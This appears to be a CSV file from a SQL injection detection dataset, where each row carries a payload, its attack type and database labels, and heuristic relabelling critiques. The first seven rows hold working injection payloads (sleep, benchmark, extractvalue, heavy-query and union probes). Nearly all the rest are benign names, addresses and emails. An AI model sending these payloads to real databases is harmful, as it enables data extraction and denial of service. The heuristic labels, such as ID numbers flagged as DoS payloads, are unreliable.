payload_norm,sqli_type,db_engine,confidence,reasoning,verdict,critique_reasons,suggested_type,suggested_db,id,a_type,a_db,a_signals,c_type,c_db,c_signals,payload_inner
"select benchmark ( 5000000,md5 ( 0x4c4d6142 ) ) and ( ( 'fegp' = 'fegp",time_blind,mysql,0.9,benchmark,RELABEL,reasoning too short (9 chars),time_blind,mysql,26056,time_blind,mysql,Pattern match: 'benchmark (' → time_blind (P5); DB signature: mysql,heavy_query,mysql,contains 7+ digit number (DoS-style payload),"select benchmark ( 5000000,md5 ( 0x4c4d6142 ) ) and ( ( 'fegp' = 'fegp"
"1%"" or ( select * from ( select ( sleep ( 5 ) ) ) ydpu ) and ""%"" = """,time_blind,mysql,0.9,sleep_subquery,RELABEL,reasoning too short (14 chars),time_blind,mysql,26057,time_blind,mysql,Pattern match: 'sleep (' → time_blind (P5); DB signature: mysql,boolean_blind,mysql,generic SQL structure without strong signal,"1%"" or ( select * from ( select ( sleep ( 5 ) ) ) ydpu ) and ""%"" = """
"1"" ) and 8514 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) and ( ""fpqh"" = ""fpqh",heavy_query,oracle,0.7,oracle_sysjoin,RELABEL,reasoning too short (14 chars); rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'heavy_query' (P4),boolean_blind,generic,26058,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal,"1"" ) and 8514 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) and ( ""fpqh"" = ""fpqh"
"1 ) ) as rwsn where 9946 = 9946 or extractvalue ( 1297,concat ( 0x5c,0x7171706a71, ( select ( elt ( 1297 = 1297,1 ) ) ) ,0x717a767a71 ) ) --",error_based,mysql,0.9,extractvalue,RELABEL,reasoning too short (12 chars); rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'error_based' (P4),boolean_blind,mysql,26059,boolean_blind,mysql,Pattern match: 'elt (' → boolean_blind (P3); DB signature: mysql,heavy_query,mysql,contains 7+ digit number (DoS-style payload),"1 ) ) as rwsn where 9946 = 9946 or extractvalue ( 1297,concat ( 0x5c,0x7171706a71, ( select ( elt ( 1297 = 1297,1 ) ) ) ,0x717a767a71 ) ) --"
"1'+ ( select wjpc where 5943 = 5943 and make_set ( 8403 = 8403,8899 ) ) +'",boolean_blind,mysql,0.7,make_set,RELABEL,reasoning too short (8 chars),boolean_blind,mysql,26060,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal,"1'+ ( select wjpc where 5943 = 5943 and make_set ( 8403 = 8403,8899 ) ) +'"
"1%' ) ) ( select ( case when ( 4587 = 4587 ) then regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) else char ( 76 ) ||char ( 65 ) ||char ( 102 ) ||char ( 72 ) end ) from ( values ( 0 ) ) ) and ( ( '%' = '",time_blind,postgresql,0.7,regexp_substring,RELABEL,reasoning too short (16 chars); rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'time_blind' (P5),boolean_blind,generic,26061,boolean_blind,generic,generic SQL keywords without specific signal,heavy_query,generic,contains 7+ digit number (DoS-style payload),"1%' ) ) ( select ( case when ( 4587 = 4587 ) then regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) else char ( 76 ) ||char ( 65 ) ||char ( 102 ) ||char ( 72 ) end ) from ( values ( 0 ) ) ) and ( ( '%' = '"
-9456%' ) ) ) order by 1#,union_based,generic,0.7,union_select,RELABEL,reasoning too short (12 chars),union_based,generic,26062,benign,generic,no attack signal detected,benign,generic,no SQLi signal in heuristic check,-9456%' ) ) ) order by 1#
99745017c,benign,generic,0.9,not_sql_injection,RELABEL,reasoning too short (17 chars),benign,generic,26063,benign,generic,no attack signal detected,heavy_query,generic,contains 7+ digit number (DoS-style payload),99745017c
ejerci78,benign,generic,0.9,not_sql_injection,RELABEL,reasoning too short (17 chars),benign,generic,26064,benign,generic,no attack signal detected,benign,generic,no SQLi signal in heuristic check,ejerci78
"calle valencia de don juan 161, 7?d",benign,generic,0.9,not_sql_injection,RELABEL,reasoning too short (17 chars),benign,generic,26065,benign,generic,no attack signal detected,benign,generic,no SQLi signal in heuristic check,"calle valencia de don juan 161, 7?d"
b3r3al,benign,generic,0.9,not_sql_injection,RELABEL,reasoning too short (17 chars),benign,generic,26066,benign,generic,no attack signal detected,benign,generic,no SQLi signal in heuristic check,b3r3al
46942381w,benign,generic,0.9,not_sql_injection,RELABEL,reasoning too short (17 chars),benign,generic,26067,benign,generic,no attack signal detected,heavy_query,generic,contains 7+ digit number (DoS-style payload),46942381w
elder@parcalia.hn,benign,generic,0.9,not_sql_injection,RELABEL,reasoning too short (17 chars),benign,generic,26068,benign,generic,no attack signal detected,benign,generic,no SQLi signal in heuristic check,elder@parcalia.hn
24596413y,benign,generic,0.9,not_sql_injection,RELABEL,reasoning too short (17 chars),benign,generic,26069,benign,generic,no attack signal detected,heavy_query,generic,contains 7+ digit number (DoS-style payload),24596413y
compte,benign,generic,0.9,not_sql_injection,RELABEL,reasoning too short (17 chars),benign,generic,26070,benign,generic,no attack signal detected,benign,generic,no SQLi signal in heuristic check,compte
leshowit,benign,generic,0.9,not_sql_injection,RELABEL,reasoning too short (17 chars),benign,generic,26071,benign,generic,no attack signal detected,benign,generic,no SQLi signal in heuristic check,leshowit
lehar,benign,generic,0.9,not_sql_injection,RELABEL,reasoning too short (17 chars),benign,generic,26072,benign,generic,no attack signal detected,benign,generic,no SQLi signal in heuristic check,lehar
45699398p,benign,generic,0.9,not_sql_injection,RELABEL,reasoning too short (17 chars),benign,generic,26073,benign,generic,no attack signal detected,heavy_query,generic,contains 7+ digit number (DoS-style payload),45699398p
"calle profesor angel lacalle, s/n,",benign,generic,0.9,not_sql_injection,RELABEL,reasoning too short (17 chars),benign,generic,26074,benign,generic,no attack signal detected,benign,generic,no SQLi signal in heuristic check,"calle profesor angel lacalle, s/n,"
tardn,benign,generic,0.9,not_sql_injection,RELABEL,reasoning too short (17 chars),benign,generic,26075,benign,generic,no attack signal detected,benign,generic,no SQLi signal in heuristic check,tardn
3.54937E+15,benign,generic,0.9,not_sql_injection,RELABEL,reasoning too short (17 chars),benign,generic,26076,benign,generic,no attack signal detected,benign,generic,no SQLi signal in heuristic check,3.54937E+15
rigby,benign,generic,0.9,not_sql_injection,RELABEL,reasoning too short (17 chars),benign,generic,26077,benign,generic,no attack signal detected,benign,generic,no SQLi signal in heuristic check,rigby
caada del hoyo,benign,generic,0.9,not_sql_injection,RELABEL,reasoning too short (17 chars),benign,generic,26078,benign,generic,no attack signal detected,benign,generic,no SQLi signal in heuristic check,caada del hoyo
englert,benign,generic,0.9,not_sql_injection,RELABEL,reasoning too short (17 chars),benign,generic,26079,benign,generic,no attack signal detected,benign,generic,no SQLi signal in heuristic check,englert
threader,benign,generic,0.9,not_sql_injection,RELABEL,reasoning too short (17 chars),benign,generic,26080,benign,generic,no attack signal detected,benign,generic,no SQLi signal in heuristic check,threader
elias pallares,benign,generic,0.9,not_sql_injection,RELABEL,reasoning too short (17 chars),benign,generic,26081,benign,generic,no attack signal detected,benign,generic,no SQLi signal in heuristic check,elias pallares
f1581il2ente,benign,generic,0.9,not_sql_injection,RELABEL,reasoning too short (17 chars),benign,generic,26082,benign,generic,no attack signal detected,benign,generic,no SQLi signal in heuristic check,f1581il2ente
57317186j,benign,generic,0.9,not_sql_injection,RELABEL,reasoning too short (17 chars),benign,generic,26083,benign,generic,no attack signal detected,heavy_query,generic,contains 7+ digit number (DoS-style payload),57317186j
bocana$da,benign,generic,0.9,not_sql_injection,RELABEL,reasoning too short (17 chars),benign,generic,26084,benign,generic,no attack signal detected,benign,generic,no SQLi signal in heuristic check,bocana$da
escarpelo,benign,generic,0.9,not_sql_injection,RELABEL,reasoning too short (17 chars),benign,generic,26085,benign,generic,no attack signal detected,benign,generic,no SQLi signal in heuristic check,escarpelo
3.4008E+15,benign,generic,0.9,not_sql_injection,RELABEL,reasoning too short (17 chars),benign,generic,26086,benign,generic,no attack signal detected,benign,generic,no SQLi signal in heuristic check,3.4008E+15
"calle limones, 60,",benign,generic,0.9,not_sql_injection,RELABEL,reasoning too short (17 chars),benign,generic,26087,benign,generic,no attack signal detected,benign,generic,no SQLi signal in heuristic check,"calle limones, 60,"
dillard,benign,generic,0.9,not_sql_injection,RELABEL,reasoning too short (17 chars),benign,generic,26088,benign,generic,no attack signal detected,benign,generic,no SQLi signal in heuristic check,dillard
casas de miravete,benign,generic,0.9,not_sql_injection,RELABEL,reasoning too short (17 chars),benign,generic,26089,benign,generic,no attack signal detected,benign,generic,no SQLi signal in heuristic check,casas de miravete
olea de boedo,benign,generic,0.9,not_sql_injection,RELABEL,reasoning too short (17 chars),benign,generic,26090,benign,generic,no attack signal detected,benign,generic,no SQLi signal in heuristic check,olea de boedo
empuar,benign,generic,0.9,not_sql_injection,RELABEL,reasoning too short (17 chars),benign,generic,26091,benign,generic,no attack signal detected,benign,generic,no SQLi signal in heuristic check,empuar
0o380ado6,benign,generic,0.9,not_sql_injection,RELABEL,reasoning too short (17 chars),benign,generic,26092,benign,generic,no attack signal detected,benign,generic,no SQLi signal in heuristic check,0o380ado6
montroy,benign,generic,0.9,not_sql_injection,RELABEL,reasoning too short (17 chars),benign,generic,26093,benign,generic,no attack signal detected,benign,generic,no SQLi signal in heuristic check,montroy
99997973e,benign,generic,0.9,not_sql_injection,RELABEL,reasoning too short (17 chars),benign,generic,26094,benign,generic,no attack signal detected,heavy_query,generic,contains 7+ digit number (DoS-style payload),99997973e
8.36404E+15,benign,generic,0.9,not_sql_injection,RELABEL,reasoning too short (17 chars),benign,generic,26095,benign,generic,no attack signal detected,benign,generic,no SQLi signal in heuristic check,8.36404E+15
"grupo fuensanta 197, 12?a",benign,generic,0.9,not_sql_injection,RELABEL,reasoning too short (17 chars),benign,generic,26096,benign,generic,no attack signal detected,benign,generic,no SQLi signal in heuristic check,"grupo fuensanta 197, 12?a"
jalance,benign,generic,0.9,not_sql_injection,RELABEL,reasoning too short (17 chars),benign,generic,26097,benign,generic,no attack signal detected,benign,generic,no SQLi signal in heuristic check,jalance
4.20136E+14,benign,generic,0.9,not_sql_injection,RELABEL,reasoning too short (17 chars),benign,generic,26098,benign,generic,no attack signal detected,benign,generic,no SQLi signal in heuristic check,4.20136E+14
"c/ ricardo gutierrez 26, 8-d",benign,generic,0.9,not_sql_injection,RELABEL,reasoning too short (17 chars),benign,generic,26099,benign,generic,no attack signal detected,benign,generic,no SQLi signal in heuristic check,"c/ ricardo gutierrez 26, 8-d"
ivancevi,benign,generic,0.9,not_sql_injection,RELABEL,reasoning too short (17 chars),benign,generic,26100,benign,generic,no attack signal detected,benign,generic,no SQLi signal in heuristic check,ivancevi
castil de vela,benign,generic,0.9,not_sql_injection,RELABEL,reasoning too short (17 chars),benign,generic,26101,benign,generic,no attack signal detected,benign,generic,no SQLi signal in heuristic check,castil de vela
genaro,benign,generic,0.9,not_sql_injection,RELABEL,reasoning too short (17 chars),benign,generic,26102,benign,generic,no attack signal detected,benign,generic,no SQLi signal in heuristic check,genaro
ergasto,benign,generic,0.9,not_sql_injection,RELABEL,reasoning too short (17 chars),benign,generic,26103,benign,generic,no attack signal detected,benign,generic,no SQLi signal in heuristic check,ergasto
"llosa de ranes, la",benign,generic,0.9,not_sql_injection,RELABEL,reasoning too short (17 chars),benign,generic,26104,benign,generic,no attack signal detected,benign,generic,no SQLi signal in heuristic check,"llosa de ranes, la"
es2eri5o,benign,generic,0.9,not_sql_injection,RELABEL,reasoning too short (17 chars),benign,generic,26105,benign,generic,no attack signal detected,benign,generic,no SQLi signal in heuristic check,es2eri5o
cuenca,benign,generic,0.9,not_sql_injection,RELABEL,reasoning too short (17 chars),benign,generic,26106,benign,generic,no attack signal detected,benign,generic,no SQLi signal in heuristic check,cuenca
02054707w,benign,generic,0.9,not_sql_injection,RELABEL,reasoning too short (17 chars),benign,generic,26107,benign,generic,no attack signal detected,heavy_query,generic,contains 7+ digit number (DoS-style payload),02054707w
21184515c,benign,generic,0.9,not_sql_injection,RELABEL,reasoning too short (17 chars),benign,generic,26108,benign,generic,no attack signal detected,heavy_query,generic,contains 7+ digit number (DoS-style payload),21184515c
5.71439E+15,benign,generic,0.9,not_sql_injection,RELABEL,reasoning too short (17 chars),benign,generic,26109,benign,generic,no attack signal detected,benign,generic,no SQLi signal in heuristic check,5.71439E+15
marcano giner,benign,generic,0.9,not_sql_injection,RELABEL,reasoning too short (17 chars),benign,generic,26110,benign,generic,no attack signal detected,benign,generic,no SQLi signal in heuristic check,marcano giner
lemoine5@informatica2009.zr,benign,generic,0.9,not_sql_injection,RELABEL,reasoning too short (17 chars),benign,generic,26111,benign,generic,no attack signal detected,benign,generic,no SQLi signal in heuristic check,lemoine5@informatica2009.zr
pr3caz,benign,generic,0.9,not_sql_injection,RELABEL,reasoning too short (17 chars),benign,generic,26112,benign,generic,no attack signal detected,benign,generic,no SQLi signal in heuristic check,pr3caz
marsh@comerciosaspe.ke,benign,generic,0.9,not_sql_injection,RELABEL,reasoning too short (17 chars),benign,generic,26113,benign,generic,no attack signal detected,benign,generic,no SQLi signal in heuristic check,marsh@comerciosaspe.ke
inescourt7@citycvs.mil,benign,generic,0.9,not_sql_injection,RELABEL,reasoning too short (17 chars),benign,generic,26114,benign,generic,no attack signal detected,benign,generic,no SQLi signal in heuristic check,inescourt7@citycvs.mil
"c/ julia minguillon, 179, 7-a",benign,generic,0.9,not_sql_injection,RELABEL,reasoning too short (17 chars),benign,generic,26115,benign,generic,no attack signal detected,benign,generic,no SQLi signal in heuristic check,"c/ julia minguillon, 179, 7-a"
obsequ.iosa,benign,generic,0.9,not_sql_injection,RELABEL,reasoning too short (17 chars),benign,generic,26116,benign,generic,no attack signal detected,benign,generic,no SQLi signal in heuristic check,obsequ.iosa
"calle carlos amel, 32, 12?h",benign,generic,0.9,not_sql_injection,RELABEL,reasoning too short (17 chars),benign,generic,26117,benign,generic,no attack signal detected,benign,generic,no SQLi signal in heuristic check,"calle carlos amel, 32, 12?h"
kallewar,benign,generic,0.9,not_sql_injection,RELABEL,reasoning too short (17 chars),benign,generic,26118,benign,generic,no attack signal detected,benign,generic,no SQLi signal in heuristic check,kallewar
59760678p,benign,generic,0.9,not_sql_injection,RELABEL,reasoning too short (17 chars),benign,generic,26119,benign,generic,no attack signal detected,heavy_query,generic,contains 7+ digit number (DoS-style payload),59760678p
toperzer1,benign,generic,0.9,not_sql_injection,RELABEL,reasoning too short (17 chars),benign,generic,26120,benign,generic,no attack signal detected,benign,generic,no SQLi signal in heuristic check,toperzer1
canaan,benign,generic,0.9,not_sql_injection,RELABEL,reasoning too short (17 chars),benign,generic,26121,benign,generic,no attack signal detected,benign,generic,no SQLi signal in heuristic check,canaan
suzuki,benign,generic,0.9,not_sql_injection,RELABEL,reasoning too short (17 chars),benign,generic,26122,benign,generic,no attack signal detected,benign,generic,no SQLi signal in heuristic check,suzuki
"antigua de ancora s/n,",benign,generic,0.9,not_sql_injection,RELABEL,reasoning too short (17 chars),benign,generic,26123,benign,generic,no attack signal detected,benign,generic,no SQLi signal in heuristic check,"antigua de ancora s/n,"
"calle dean miranda 106, 6-f",benign,generic,0.9,not_sql_injection,RELABEL,reasoning too short (17 chars),benign,generic,26124,benign,generic,no attack signal detected,benign,generic,no SQLi signal in heuristic check,"calle dean miranda 106, 6-f"
madgett,benign,generic,0.9,not_sql_injection,RELABEL,reasoning too short (17 chars),benign,generic,26125,benign,generic,no attack signal detected,benign,generic,no SQLi signal in heuristic check,madgett
gerola pugliesi,benign,generic,0.9,not_sql_injection,RELABEL,reasoning too short (17 chars),benign,generic,26126,benign,generic,no attack signal detected,benign,generic,no SQLi signal in heuristic check,gerola pugliesi
"c/ comedias, 109,",benign,generic,0.9,not_sql_injection,RELABEL,reasoning too short (17 chars),benign,generic,26127,benign,generic,no attack signal detected,benign,generic,no SQLi signal in heuristic check,"c/ comedias, 109,"
8.61689E+15,benign,generic,0.9,not_sql_injection,RELABEL,reasoning too short (17 chars),benign,generic,26128,benign,generic,no attack signal detected,benign,generic,no SQLi signal in heuristic check,8.61689E+15
tanchak,benign,generic,0.9,not_sql_injection,RELABEL,reasoning too short (17 chars),benign,generic,26129,benign,generic,no attack signal detected,benign,generic,no SQLi signal in heuristic check,tanchak
"don quijote 81,",benign,generic,0.9,not_sql_injection,RELABEL,reasoning too short (17 chars),benign,generic,26130,benign,generic,no attack signal detected,benign,generic,no SQLi signal in heuristic check,"don quijote 81,"
ceferina,benign,generic,0.9,not_sql_injection,RELABEL,reasoning too short (17 chars),benign,generic,26131,benign,generic,no attack signal detected,benign,generic,no SQLi signal in heuristic check,ceferina
saturnino,benign,generic,0.9,not_sql_injection,RELABEL,reasoning too short (17 chars),benign,generic,26132,benign,generic,no attack signal detected,benign,generic,no SQLi signal in heuristic check,saturnino
israel_piggot@joyclub.pe,benign,generic,0.9,not_sql_injection,RELABEL,reasoning too short (17 chars),benign,generic,26133,benign,generic,no attack signal detected,benign,generic,no SQLi signal in heuristic check,israel_piggot@joyclub.pe
5n37do,benign,generic,0.9,not_sql_injection,RELABEL,reasoning too short (17 chars),benign,generic,26134,benign,generic,no attack signal detected,benign,generic,no SQLi signal in heuristic check,5n37do
lanfranchi@getgold.tl,benign,generic,0.9,not_sql_injection,RELABEL,reasoning too short (17 chars),benign,generic,26135,benign,generic,no attack signal detected,benign,generic,no SQLi signal in heuristic check,lanfranchi@getgold.tl
micaas,benign,generic,0.9,not_sql_injection,RELABEL,reasoning too short (17 chars),benign,generic,26136,benign,generic,no attack signal detected,benign,generic,no SQLi signal in heuristic check,micaas
herrmann@codwatw.edu,benign,generic,0.9,not_sql_injection,RELABEL,reasoning too short (17 chars),benign,generic,26137,benign,generic,no attack signal detected,benign,generic,no SQLi signal in heuristic check,herrmann@codwatw.edu
9.48E+15,benign,generic,0.9,not_sql_injection,RELABEL,reasoning too short (17 chars),benign,generic,26138,benign,generic,no attack signal detected,benign,generic,no SQLi signal in heuristic check,9.48E+15
5.83899E+15,benign,generic,0.9,not_sql_injection,RELABEL,reasoning too short (17 chars),benign,generic,26139,benign,generic,no attack signal detected,benign,generic,no SQLi signal in heuristic check,5.83899E+15
irissou,benign,generic,0.9,not_sql_injection,RELABEL,reasoning too short (17 chars),benign,generic,26140,benign,generic,no attack signal detected,benign,generic,no SQLi signal in heuristic check,irissou
quisto,benign,generic,0.9,not_sql_injection,RELABEL,reasoning too short (17 chars),benign,generic,26141,benign,generic,no attack signal detected,benign,generic,no SQLi signal in heuristic check,quisto
s5bal850de,benign,generic,0.9,not_sql_injection,RELABEL,reasoning too short (17 chars),benign,generic,26142,benign,generic,no attack signal detected,benign,generic,no SQLi signal in heuristic check,s5bal850de
balsam-prey@mmo.com.cat,benign,generic,0.9,not_sql_injection,RELABEL,reasoning too short (17 chars),benign,generic,26143,benign,generic,no attack signal detected,benign,generic,no SQLi signal in heuristic check,balsam-prey@mmo.com.cat
lurlene,benign,generic,0.9,not_sql_injection,RELABEL,reasoning too short (17 chars),benign,generic,26144,benign,generic,no attack signal detected,benign,generic,no SQLi signal in heuristic check,lurlene
"c/ elvas 112, 13-a",benign,generic,0.9,not_sql_injection,RELABEL,reasoning too short (17 chars),benign,generic,26145,benign,generic,no attack signal detected,benign,generic,no SQLi signal in heuristic check,"c/ elvas 112, 13-a"
"de canoves 13,",benign,generic,0.9,not_sql_injection,RELABEL,reasoning too short (17 chars),benign,generic,26146,benign,generic,no attack signal detected,benign,generic,no SQLi signal in heuristic check,"de canoves 13,"
hembrick,benign,generic,0.9,not_sql_injection,RELABEL,reasoning too short (17 chars),benign,generic,26147,benign,generic,no attack signal detected,benign,generic,no SQLi signal in heuristic check,hembrick
1.76488E+15,benign,generic,0.9,not_sql_injection,RELABEL,reasoning too short (17 chars),benign,generic,26148,benign,generic,no attack signal detected,benign,generic,no SQLi signal in heuristic check,1.76488E+15
darcy@google-movil.dz,benign,generic,0.9,not_sql_injection,RELABEL,reasoning too short (17 chars),benign,generic,26149,benign,generic,no attack signal detected,benign,generic,no SQLi signal in heuristic check,darcy@google-movil.dz
katia,benign,generic,0.9,not_sql_injection,RELABEL,reasoning too short (17 chars),benign,generic,26150,benign,generic,no attack signal detected,benign,generic,no SQLi signal in heuristic check,katia
lenya@fbi-criminal-network.com.mil,benign,generic,0.9,not_sql_injection,RELABEL,reasoning too short (17 chars),benign,generic,26151,benign,generic,no attack signal detected,benign,generic,no SQLi signal in heuristic check,lenya@fbi-criminal-network.com.mil
3.81894E+15,benign,generic,0.9,not_sql_injection,RELABEL,reasoning too short (17 chars),benign,generic,26152,benign,generic,no attack signal detected,benign,generic,no SQLi signal in heuristic check,3.81894E+15
penarroya ingla,benign,generic,0.9,not_sql_injection,RELABEL,reasoning too short (17 chars),benign,generic,26153,benign,generic,no attack signal detected,benign,generic,no SQLi signal in heuristic check,penarroya ingla
6.65741E+15,benign,generic,0.9,not_sql_injection,RELABEL,reasoning too short (17 chars),benign,generic,26154,benign,generic,no attack signal detected,benign,generic,no SQLi signal in heuristic check,6.65741E+15
"calle artigako haritza, s/n 8?d",benign,generic,0.9,not_sql_injection,RELABEL,reasoning too short (17 chars),benign,generic,26155,benign,generic,no attack signal detected,benign,generic,no SQLi signal in heuristic check,"calle artigako haritza, s/n 8?d"
kiyohara,benign,generic,0.9,not_sql_injection,RELABEL,reasoning too short (17 chars),benign,generic,26156,benign,generic,no attack signal detected,benign,generic,no SQLi signal in heuristic check,kiyohara
iracema,benign,generic,0.9,not_sql_injection,RELABEL,reasoning too short (17 chars),benign,generic,26157,benign,generic,no attack signal detected,benign,generic,no SQLi signal in heuristic check,iracema
recabdador,benign,generic,0.9,not_sql_injection,RELABEL,reasoning too short (17 chars),benign,generic,26158,benign,generic,no attack signal detected,benign,generic,no SQLi signal in heuristic check,recabdador
bernadet,benign,generic,0.9,not_sql_injection,RELABEL,reasoning too short (17 chars),benign,generic,26159,benign,generic,no attack signal detected,benign,generic,no SQLi signal in heuristic check,bernadet
76150645z,benign,generic,0.9,not_sql_injection,RELABEL,reasoning too short (17 chars),benign,generic,26160,benign,generic,no attack signal detected,heavy_query,generic,contains 7+ digit number (DoS-style payload),76150645z
nehemiah,benign,generic,0.9,not_sql_injection,RELABEL,reasoning too short (17 chars),benign,generic,26161,benign,generic,no attack signal detected,benign,generic,no SQLi signal in heuristic check,nehemiah
reiji,benign,generic,0.9,not_sql_injection,RELABEL,reasoning too short (17 chars),benign,generic,26162,benign,generic,no attack signal detected,benign,generic,no SQLi signal in heuristic check,reiji
"plaa gabriela mistral, 140",benign,generic,0.9,not_sql_injection,RELABEL,reasoning too short (17 chars),benign,generic,26163,benign,generic,no attack signal detected,benign,generic,no SQLi signal in heuristic check,"plaa gabriela mistral, 140"
mirabel,benign,generic,0.9,not_sql_injection,RELABEL,reasoning too short (17 chars),benign,generic,26164,benign,generic,no attack signal detected,benign,generic,no SQLi signal in heuristic check,mirabel
sanidad,benign,generic,0.9,not_sql_injection,RELABEL,reasoning too short (17 chars),benign,generic,26165,benign,generic,no attack signal detected,benign,generic,no SQLi signal in heuristic check,sanidad
arriharn espinet,benign,generic,0.9,not_sql_injection,RELABEL,reasoning too short (17 chars),benign,generic,26166,benign,generic,no attack signal detected,benign,generic,no SQLi signal in heuristic check,arriharn espinet
alguer murillo,benign,generic,0.9,not_sql_injection,RELABEL,reasoning too short (17 chars),benign,generic,26167,benign,generic,no attack signal detected,benign,generic,no SQLi signal in heuristic check,alguer murillo
swearing,benign,generic,0.9,not_sql_injection,RELABEL,reasoning too short (17 chars),benign,generic,26168,benign,generic,no attack signal detected,benign,generic,no SQLi signal in heuristic check,swearing
lightfie,benign,generic,0.9,not_sql_injection,RELABEL,reasoning too short (17 chars),benign,generic,26169,benign,generic,no attack signal detected,benign,generic,no SQLi signal in heuristic check,lightfie
epnimo,benign,generic,0.9,not_sql_injection,RELABEL,reasoning too short (17 chars),benign,generic,26170,benign,generic,no attack signal detected,benign,generic,no SQLi signal in heuristic check,epnimo
guillen,benign,generic,0.9,not_sql_injection,RELABEL,reasoning too short (17 chars),benign,generic,26171,benign,generic,no attack signal detected,benign,generic,no SQLi signal in heuristic check,guillen
mahbeer,benign,generic,0.9,not_sql_injection,RELABEL,reasoning too short (17 chars),benign,generic,26172,benign,generic,no attack signal detected,benign,generic,no SQLi signal in heuristic check,mahbeer
zohar@pablobracamonte.bh,benign,generic,0.9,not_sql_injection,RELABEL,reasoning too short (17 chars),benign,generic,26173,benign,generic,no attack signal detected,benign,generic,no SQLi signal in heuristic check,zohar@pablobracamonte.bh
azarshah,benign,generic,0.9,not_sql_injection,RELABEL,reasoning too short (17 chars),benign,generic,26174,benign,generic,no attack signal detected,benign,generic,no SQLi signal in heuristic check,azarshah
m7124v3,benign,generic,0.9,not_sql_injection,RELABEL,reasoning too short (17 chars),benign,generic,26175,benign,generic,no attack signal detected,benign,generic,no SQLi signal in heuristic check,m7124v3
medianero,benign,generic,0.9,not_sql_injection,RELABEL,reasoning too short (17 chars),benign,generic,26176,benign,generic,no attack signal detected,benign,generic,no SQLi signal in heuristic check,medianero
euzaine@schnapps.com.gs,benign,generic,0.9,not_sql_injection,RELABEL,reasoning too short (17 chars),benign,generic,26177,benign,generic,no attack signal detected,benign,generic,no SQLi signal in heuristic check,euzaine@schnapps.com.gs
amelia,benign,generic,0.9,not_sql_injection,RELABEL,reasoning too short (17 chars),benign,generic,26178,benign,generic,no attack signal detected,benign,generic,no SQLi signal in heuristic check,amelia
estival,benign,generic,0.9,not_sql_injection,RELABEL,reasoning too short (17 chars),benign,generic,26179,benign,generic,no attack signal detected,benign,generic,no SQLi signal in heuristic check,estival
3.98E+15,benign,generic,0.9,not_sql_injection,RELABEL,reasoning too short (17 chars),benign,generic,26180,benign,generic,no attack signal detected,benign,generic,no SQLi signal in heuristic check,3.98E+15
"calle manco, 109, 10-g",benign,generic,0.9,not_sql_injection,RELABEL,reasoning too short (17 chars),benign,generic,26181,benign,generic,no attack signal detected,benign,generic,no SQLi signal in heuristic check,"calle manco, 109, 10-g"
vinko,benign,generic,0.9,not_sql_injection,RELABEL,reasoning too short (17 chars),benign,generic,26182,benign,generic,no attack signal detected,benign,generic,no SQLi signal in heuristic check,vinko
parke antonio trueba 175,benign,generic,0.9,not_sql_injection,RELABEL,reasoning too short (17 chars),benign,generic,26183,benign,generic,no attack signal detected,benign,generic,no SQLi signal in heuristic check,parke antonio trueba 175
8.5138E+15,benign,generic,0.9,not_sql_injection,RELABEL,reasoning too short (17 chars),benign,generic,26184,benign,generic,no attack signal detected,benign,generic,no SQLi signal in heuristic check,8.5138E+15
9.84215E+15,benign,generic,0.9,not_sql_injection,RELABEL,reasoning too short (17 chars),benign,generic,26185,benign,generic,no attack signal detected,benign,generic,no SQLi signal in heuristic check,9.84215E+15
"calle la revoltosa, 55, 11c",benign,generic,0.9,not_sql_injection,RELABEL,reasoning too short (17 chars),benign,generic,26186,benign,generic,no attack signal detected,benign,generic,no SQLi signal in heuristic check,"calle la revoltosa, 55, 11c"
"calle hostieros, 24",benign,generic,0.9,not_sql_injection,RELABEL,reasoning too short (17 chars),benign,generic,26187,benign,generic,no attack signal detected,benign,generic,no SQLi signal in heuristic check,"calle hostieros, 24"
condensativo,benign,generic,0.9,not_sql_injection,RELABEL,reasoning too short (17 chars),benign,generic,26188,benign,generic,no attack signal detected,benign,generic,no SQLi signal in heuristic check,condensativo
